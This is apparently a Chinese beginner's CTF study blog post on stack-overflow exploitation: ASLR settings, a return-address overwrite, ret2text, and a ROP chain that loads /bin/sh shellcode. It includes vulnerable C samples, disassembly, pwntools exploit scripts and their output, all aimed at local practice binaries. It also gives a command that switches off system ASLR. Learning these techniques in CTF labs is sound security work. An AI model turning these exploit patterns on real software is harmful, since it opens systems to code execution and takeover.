---
title: 'pwn真的入门了'
date: 2019-01-01
category: 'pwn相关'
tags: []
lang: 'zh'
draft: true
---
终于沉下心来好好的把ctf-wiki上的pwn部分看了一下(当然菜鸡的我海之看懂了栈)

首先需要补充一下aslr
> 我们可以通过修改 /proc/sys/kernel/randomize_va_space 来控制 ASLR 启动与否，具体的选项有
0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。
1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。
2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。
我们可以使用echo 0 > /proc/sys/kernel/randomize_va_space关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。
# 栈溢出原理

最基本的栈溢出原理无非就是通过控制输入， 填充， 覆盖掉ebp， 同时重写返回地址

比如：
```
#include <stdio.h>
#include <string.h>
void success() { puts("You Hava already controlled it."); }
void vulnerable() {
  char s[12];
  gets(s);
  puts(s);
  return;
}
int main(int argc, char **argv) {
  vulnerable();
  return 0;
}
```
当然我是把很多模式都关掉了

```
 % checksec stack_example
[*] '/home/abc/Desktop/pwn/example/stack_example'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

使用 `-fno-stack-protector`和`-no-pie`关闭`canary`和`PIE`

IDA拖进去之后主要是看`vulnerable`函数
```
int vulnerable()
{
  char s; // [sp+4h] [bp-14h]@1

  gets(&s);
  return puts(&s);
}
```

可以知道`s`距离 `ebp`为0x14h个字节

直接冲掉， 同时把返回地址变成我们想要的
```
.text:08048456 success         proc near
.text:08048456
.text:08048456 var_4           = dword ptr -4
.text:08048456
.text:08048456                 push    ebp
.text:08048457                 mov     ebp, esp
.text:08048459                 push    ebx
.text:0804845A                 sub     esp, 4
.text:0804845D                 call    __x86_get_pc_thunk_ax
.text:08048462                 add     eax, 1B9Eh
.text:08048467                 sub     esp, 0Ch
.text:0804846A                 lea     edx, (aYouHavaAlready - 804A000h)[eax] ; "You Hava already controlled it."
.text:08048470                 push    edx             ; s
.text:08048471                 mov     ebx, eax
.text:08048473                 call    _puts
.text:08048478                 add     esp, 10h
.text:0804847B                 nop
.text:0804847C                 mov     ebx, [ebp+var_4]
.text:0804847F                 leave
.text:08048480                 retn
.text:08048480 success         endp
```

返回地址需要变成 `0x08048456`

然后写exp
```
from pwn import *

context.binary = './stack_example'
if args['DEBUG']:
    context.log_level = 'debug'

#context.log_level = 'debug'

p = process('./stack_example')

payload = 'a'*0x14+'bbbb'

payload += p32(0x08048456)

p.sendline(payload)

p.interactive()
```

结果：
```
 % python exp.py
[*] '/home/abc/Desktop/pwn/example/stack_example'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './stack_example': pid 48512
[*] Switching to interactive mode
aaaaaaaaaaaaaaaaaaaabbbbV\x84\x0
You Hava already controlled it.
[*] Got EOF while reading in interactive
$ whoami
[*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 48512)
[*] Got EOF while sending in interactive
```

# ret2text

IDA拖进去之后看main
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("There is something amazing here, do you know anything?");
  gets((char *)&v4);
  printf("Maybe I will tell you next time !");
  return 0;
}
```
显然是通过`gets()`函数来达到目的

注意到其中还有一个`secure`函数

```
void secure()
{
  unsigned int v0; // eax@1
  int input; // [sp+18h] [bp-10h]@1
  int secretcode; // [sp+1Ch] [bp-Ch]@1

  v0 = time(0);
  srand(v0);
  secretcode = rand();
  __isoc99_scanf((const char *)&unk_8048760, &input);
  if ( input == secretcode )
    system("/bin/sh");
}
```
通过这个函数可以获得一个shell

但是似乎好像我没成功？？

先使用`cycli`生成一堆字符串

```
 % cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

然后gdb启动

得到
```
Invalid address 0x62616164
```
之后
```
cyclic -l 0x62616164
```
得到偏移 为 112

之后写脚本
```
 % cat exp.py
from pwn import *
proc = './ret2text'
p = process(proc)
p.sendafter('?', 'a'*112+p32(0x080485FD))
p.interactive()
```
但是我好像没有成功。。
```
 % python exp.py
[+] Starting local process './ret2text': pid 54723
[*] Switching to interactive mode

$
```

# static

之后再看一下君莫笑师傅的题目
源码如下：
```
#include <stdio.h>
#include <unistd.h>

void init(){
    setvbuf(stdout, NULL, _IOLBF, 0);
}

void welcome(){
    write(1, "Welcome to zsctf!\n", 21);
}

void vuln(){
    char buffer[8] = {0};
    read(0, buffer, 0x40);
}

int main(){
    init();
    welcome();
    vuln();
    return 0;
}
```
查看一下报护

```
 % checksec static
[*] '/home/abc/Desktop/pwnEaxmple/static/static'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

同样的：
得到
```
Invalid address 0x61616166
```
计算出偏移地址
```
 % cyclic -l 0x61616166
20
```

最后看下exp
```
 % cat exp.py
from pwn import *
import time
proc = './static'
bss_addr = 0x0804A024

context.binary = proc
shellcode = asm(shellcraft.sh())

p = process(proc)

rop = ROP(proc)

rop.read(0, bss_addr+100, len(shellcode))
rop.call(bss_addr+100)

p.recvuntil("Welcome to zsctf!")

p.send('a'*20+str(rop))
time.sleep(1)

p.send(shellcode)

p.interactive()

```

需要注意的是 其实 `proc`是一个pwn内置的一个模块了

```
In [1]: from pwn import *

In [2]: proc
Out[2]: <module 'pwnlib.util.proc' from '/usr/local/lib/python2.7/dist-packages/pwnlib/util/proc.pyc'>

```
